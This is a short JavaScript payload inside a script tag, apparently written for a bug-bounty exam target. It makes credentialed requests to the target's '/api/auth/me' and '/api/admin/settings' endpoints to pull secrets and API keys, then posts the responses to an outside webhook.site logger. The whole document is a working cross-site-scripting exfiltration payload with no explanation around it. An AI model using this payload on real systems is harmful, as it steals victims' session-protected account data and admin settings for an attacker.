<script>
    const logger = "https://webhook.site/d611200f-fe78-4019-b923-b3c30712d153";

    async function findSecret() {
        // Try the 'Me' endpoint - often contains API keys or secrets
        try {
            const res = await fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/me", {
                method: "GET",
                credentials: "include"
            });
            const data = await res.json();
            
            // Leak it to your webhook
            fetch(logger, {
                method: "POST",
                body: JSON.stringify({ source: "AUTH_ME", data: data })
            });
        } catch (e) {}

        // Try a 'Settings' endpoint just in case
        try {
            const res2 = await fetch("https://api-bugbounty-exam.hashacademy.co/api/admin/settings", {
                method: "GET",
                credentials: "include"
            });
            const data2 = await res2.json();
            fetch(logger, {
                method: "POST",
                body: JSON.stringify({ source: "ADMIN_SETTINGS", data: data2 })
            });
        } catch (e) {}
    }

    findSecret();
</script>
